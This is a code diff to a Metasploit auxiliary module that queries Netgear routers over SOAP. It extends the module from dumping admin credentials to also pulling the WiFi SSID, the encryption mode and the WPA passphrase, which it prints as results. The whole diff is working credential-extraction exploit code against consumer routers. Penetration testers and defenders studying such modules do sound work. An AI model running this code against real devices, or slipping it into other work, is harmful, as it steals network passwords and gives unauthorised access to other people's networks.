@@ -56,6 +56,16 @@ class MetasploitModule < Msf::Auxiliary
     action = 'urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo'
     print_status("Extracting credentials...")
     extract_data(action)
+
+    # extract wifi info
+    action = 'urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetInfo'
+    print_status("Extracting Wifi...")
+    extract_data(action)
+
+    # extract WPA info
+    action = 'urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetWPASecurityKeys'
+    print_status("Extracting WPA Keys...")
+    extract_data(action)
   end
 
   def extract_data(soap_action)
@@ -92,6 +102,21 @@ class MetasploitModule < Msf::Auxiliary
         #store all details as loot
         loot = store_loot('netgear_soap_device.config', 'text/plain', rhost, res.body)
         print_good("Device details downloaded to: #{loot}")
+      end
+
+      if res.body =~ /<NewSSID>(.*)<\/NewSSID>/
+        ssid = $1
+        print_good("Wifi SSID: #{ssid}")
+      end
+
+      if res.body =~ /<NewBasicEncryptionModes>(.*)<\/NewBasicEncryptionModes>/
+        wifi_encryption = $1
+        print_good("Wifi Encryption: #{wifi_encryption}")
+      end
+
+      if res.body =~ /<NewWPAPassphrase>(.*)<\/NewWPAPassphrase>/
+        wifi_password = $1
+        print_good("Wifi Password: #{wifi_password}")
       end
 
     rescue ::Rex::ConnectionError
